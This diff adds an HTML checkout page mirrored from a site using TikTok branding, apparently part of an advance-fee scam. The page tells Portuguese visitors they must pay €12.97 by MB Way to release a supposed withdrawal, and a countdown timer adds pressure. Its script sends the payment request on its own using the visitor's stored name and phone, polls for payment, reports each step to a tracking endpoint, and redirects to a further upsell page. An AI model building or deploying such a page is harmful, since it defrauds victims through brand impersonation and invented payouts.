@@ -1,0 +1,283 @@
+<!doctype html>
+<html lang="pt-BR">
+
+<!-- Mirrored from tiktokportugal.vercel.app/checkout.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 May 2026 02:04:48 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout</title>
+  <script src="api/central2878?format=js"></script>
+  <script src="https://cdn.tailwindcss.com/"></script>
+  <style>
+    body { font-family: Inter, Arial, sans-serif; background: #fff; color: #161823; margin: 0; }
+    .topbar { background:#000;color:#fff;text-align:center;padding:8px 12px;font-size:12px;font-weight:700;text-transform:uppercase; }
+    .hidden { display: none !important; }
+    .countdown-card { margin:16px;border:1px solid #f7c8d5;border-radius:12px;padding:12px 14px;background:#fff5f8;text-align:center; }
+    .countdown-time { margin:0;font-size:34px;line-height:1;font-weight:900;color:#FE2C55;letter-spacing:.06em; }
+    .pay-overlay { display:none;position:fixed;inset:0;background:rgba(0,0,0,.58);z-index:9998;justify-content:center;align-items:flex-end; }
+    .pay-sheet { background:#fff;border-radius:22px 22px 0 0;padding:22px 18px 34px;width:100%;max-width:430px;margin:0 auto;text-align:center; }
+    .pay-title { margin:0 0 6px;font-size:30px;font-weight:900;color:#111827;letter-spacing:-.02em; }
+    .pay-sub { margin:0 0 14px;font-size:15px;color:#6b7280;line-height:1.45; }
+    .pay-error-text { margin:0 0 14px;color:#e11d48;font-size:13px;font-weight:700;line-height:1.4; }
+    .pay-dots { display:flex;justify-content:center;gap:8px;margin:10px 0 14px; }
+    .pay-dot { width:7px;height:7px;border-radius:999px;background:#FE2C55;animation:pay-bounce 1.2s infinite ease-in-out; }
+    .pay-dot:nth-child(2) { animation-delay:.2s; }
+    .pay-dot:nth-child(3) { animation-delay:.4s; }
+    .pay-btn-secondary { border:1px solid #e5e7eb;border-radius:999px;background:#fff;color:#6b7280;padding:9px 20px;font-size:13px;cursor:pointer; }
+    @keyframes pay-bounce { 0%,80%,100%{transform:scale(.65);opacity:.55;}40%{transform:scale(1);opacity:1;} }
+  </style>
+</head>
+<body>
+  <div class="topbar">Finalize o pagamento para libertar o levantamento</div>
+  <div id="checkoutWrap" class="max-w-md mx-auto min-h-screen pb-12 bg-white">
+    <section class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-100 bg-white">
+      <img src="assets/tiktok-logo-CtJns-A9.png" alt="TikTok Logo" class="h-24 w-24 object-contain mb-4">
+      <div class="text-center">
+        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Valor do Pagamento</p>
+        <h2 class="text-5xl font-black text-[#161823] tracking-tighter" id="amount">€ 12.97</h2>
+      </div>
+    </section>
+    <div class="px-6 py-6">
+      <div class="rounded-2xl border border-gray-200 overflow-hidden bg-white p-4">
+        <p class="text-xs font-semibold text-gray-500 mb-2">Método de Pagamento</p>
+        <div class="flex items-center gap-2">
+          <img src="assets/mb.png" alt="MB Way" class="h-6 w-auto object-contain">
+          <p class="text-lg font-black text-[#FE2C55] leading-none">MB Way</p>
+        </div>
+      </div>
+      <div class="countdown-card">
+        <p class="text-xs font-bold text-[#9f1239] uppercase">Tempo restante para concluir o pagamento</p>
+        <p id="countdown" class="countdown-time">05:00</p>
+      </div>
+    </div>
+  </div>
+
+  <div id="payOverlay" class="pay-overlay">
+    <div class="pay-sheet">
+      <div id="payFormSection">
+        <h3 class="pay-title">A ligar ao MB Way</h3>
+        <p class="pay-sub">Estamos a enviar a notificação de pagamento de <strong id="paySubtitle">€ 0,00</strong>.</p>
+        <div class="pay-dots"><span class="pay-dot"></span><span class="pay-dot"></span><span class="pay-dot"></span></div>
+      </div>
+      <div id="payWaitingSection" class="hidden">
+        <h3 class="pay-title">Aguarda a notificação MB Way</h3>
+        <p class="pay-sub">Abre o app MB Way e confirma o pagamento de <strong id="payWaitingAmount">€ 0,00</strong>.</p>
+        <div class="pay-dots"><span class="pay-dot"></span><span class="pay-dot"></span><span class="pay-dot"></span></div>
+        <button id="payCancelBtn" class="pay-btn-secondary" type="button">Cancelar</button>
+      </div>
+      <div id="payErrorSection" class="hidden">
+        <h3 class="pay-title">Não foi possível validar</h3>
+        <p id="payErrorText" class="pay-error-text"></p>
+        <button id="payBackBtn" class="pay-btn-secondary" type="button">Voltar e corrigir MB Way</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      var countdownEl = document.getElementById('countdown');
+      var amountEl = document.getElementById('amount');
+      var payOverlay = document.getElementById('payOverlay');
+      var payFormSection = document.getElementById('payFormSection');
+      var payWaitingSection = document.getElementById('payWaitingSection');
+      var payErrorSection = document.getElementById('payErrorSection');
+      var payErrorText = document.getElementById('payErrorText');
+      var paySubtitle = document.getElementById('paySubtitle');
+      var payWaitingAmount = document.getElementById('payWaitingAmount');
+      var payCancelBtn = document.getElementById('payCancelBtn');
+      var payBackBtn = document.getElementById('payBackBtn');
+
+      var amount = (window.getCentralPrice && window.getCentralPrice('front', 12.97)) || 12.97;
+      var redirects = (window.getCentralRedirect && window.getCentralRedirect('up1_entry', '/up1')) || '/up1';
+
+      amountEl.textContent = '€ ' + amount.toFixed(2);
+      paySubtitle.textContent = '€ ' + amount.toFixed(2);
+      payWaitingAmount.textContent = '€ ' + amount.toFixed(2);
+
+      var upPayId = null;
+      var upPayInterval = null;
+      var pollAttempts = 0;
+      var pollErrorStreak = 0;
+      var maxPollAttempts = 24;
+
+      function startCountdown() {
+        var total = 5 * 60;
+        function render() {
+          countdownEl.textContent = String(Math.floor(total / 60)).padStart(2, '0') + ':' + String(total % 60).padStart(2, '0');
+        }
+        render();
+        setInterval(function() {
+          total -= 1;
+          if (total < 0) return;
+          render();
+        }, 1000);
+      }
+
+      function showConnecting() {
+        payOverlay.style.display = 'flex';
+        payFormSection.classList.remove('hidden');
+        payWaitingSection.classList.add('hidden');
+        payErrorSection.classList.add('hidden');
+      }
+
+      function showWaiting() {
+        payFormSection.classList.add('hidden');
+        payWaitingSection.classList.remove('hidden');
+        payErrorSection.classList.add('hidden');
+      }
+
+      function showError(msg) {
+        payErrorText.textContent = msg || 'Erro ao validar pagamento MB Way.';
+        payFormSection.classList.add('hidden');
+        payWaitingSection.classList.add('hidden');
+        payErrorSection.classList.remove('hidden');
+      }
+
+      function normalizePhone(raw) {
+        var d = String(raw || '').replace(/\D/g, '');
+        if (d.indexOf('351') === 0) d = d.slice(3);
+        return d;
+      }
+
+      function pickPayerFromStorage() {
+        var out = { name: 'Cliente', phone: '', email: null };
+        try {
+          var raw = localStorage.getItem('mbway_payer') || sessionStorage.getItem('mbway_payer');
+          if (raw) {
+            var data = JSON.parse(raw);
+            out.name = data.name || out.name;
+            out.phone = data.phone || out.phone;
+          }
+        } catch (e) {}
+        var q = new URLSearchParams(location.search);
+        if (q.get('name')) out.name = q.get('name');
+        if (q.get('phone')) out.phone = q.get('phone');
+        if (q.get('email')) out.email = q.get('email');
+        return out;
+      }
+
+      function checkUpPayment() {
+        if (!upPayId) return;
+        fetch('/api/create-transaction?action=status', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: upPayId })
+        })
+        .then(function(r){ if (!r.ok) throw new Error('status_http_' + r.status); return r.json(); })
+        .then(function(st){
+          pollAttempts += 1;
+          pollErrorStreak = 0;
+          if (st.status === 'paid') {
+            clearInterval(upPayInterval);
+            _utmify('paid', amount);
+            var q = location.search || '';
+            var target = redirects || '/up1';
+            if (q) target += (target.indexOf('?') === -1 ? q : '&' + q.slice(1));
+            setTimeout(function(){ location.href = target; }, 450);
+            return;
+          }
+          if (st.status === 'failed') {
+            clearInterval(upPayInterval);
+            upPayInterval = null;
+            showError('Pagamento rejeitado. Verifica o número MB Way e tenta novamente.');
+            return;
+          }
+          if (pollAttempts >= maxPollAttempts) {
+            clearInterval(upPayInterval);
+            upPayInterval = null;
+            showError('Não foi possível validar a notificação MB Way.');
+          }
+        })
+        .catch(function(){
+          pollErrorStreak += 1;
+          if (pollErrorStreak >= 3) {
+            clearInterval(upPayInterval);
+            upPayInterval = null;
+            showError('Erro ao validar o pagamento no MB Way. Tenta novamente.');
+          }
+        });
+      }
+
+      function submitCheckoutPayment(name, phoneDigits, email) {
+        showConnecting();
+        fetch('/api/create-transaction', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            stage: 'front',
+            method: 'mbway',
+            amount: amount,
+            payer: { name: name, phone: '+351' + phoneDigits, email: email || null, document: null }
+          })
+        })
+        .then(function(r){ return r.json(); })
+        .then(function(d){
+          if (d.id || d.statusCode === 200) {
+            upPayId = d.id || d.transaction_id || null;
+            if (!upPayId) return showError('Não recebemos o identificador da transação MB Way.');
+            _utmify('waiting_payment', amount);
+            pollAttempts = 0;
+            pollErrorStreak = 0;
+            if (upPayInterval) clearInterval(upPayInterval);
+            showWaiting();
+            upPayInterval = setInterval(checkUpPayment, 5000);
+            return;
+          }
+          showError(d.message || 'Erro ao processar no MB Way.');
+        })
+        .catch(function(){ showError('Erro de ligação. Tenta novamente.'); });
+      }
+
+      function _utmify(st, amt) {
+        var p = new URLSearchParams(window.location.search || '');
+        fetch('/api/tracking', {
+          method: 'POST',
+          keepalive: true,
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            status: st,
+            transaction_id: upPayId || ('front-' + Date.now()),
+            amount: amt,
+            method: 'mbway',
+            product_id: 'front-checkout',
+            product_name: 'TikTok - Front Checkout',
+            customer: { name: (payer && payer.name) || '', email: (payer && payer.email) || null, phone: null, document: null },
+            utms: {
+              utm_source: p.get('utm_source'),
+              utm_medium: p.get('utm_medium'),
+              utm_campaign: p.get('utm_campaign'),
+              utm_content: p.get('utm_content'),
+              utm_term: p.get('utm_term'),
+              src: p.get('src'),
+              sck: p.get('sck')
+            }
+          })
+        }).catch(function(){});
+      }
+
+      payCancelBtn.addEventListener('click', function() {
+        if (upPayInterval) clearInterval(upPayInterval);
+        upPayInterval = null;
+        upPayId = null;
+        showError('Operação cancelada. Volta ao passo anterior para confirmar o MB Way.');
+      });
+
+      payBackBtn.addEventListener('click', function() {
+        location.href = '/confirmar-saque' + (location.search || '');
+      });
+
+      var payer = pickPayerFromStorage();
+      var phoneDigits = normalizePhone(payer.phone || '');
+      startCountdown();
+      if (payer.name && /^\d{9}$/.test(phoneDigits)) {
+        submitCheckoutPayment(payer.name, phoneDigits, payer.email || null);
+      } else {
+        showError('Dados MB Way não encontrados. Volta ao passo anterior e preenche corretamente.');
+      }
+    })();
+  </script>
+</body>
+
+<!-- Mirrored from tiktokportugal.vercel.app/checkout.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 May 2026 02:04:48 GMT -->
+</html>
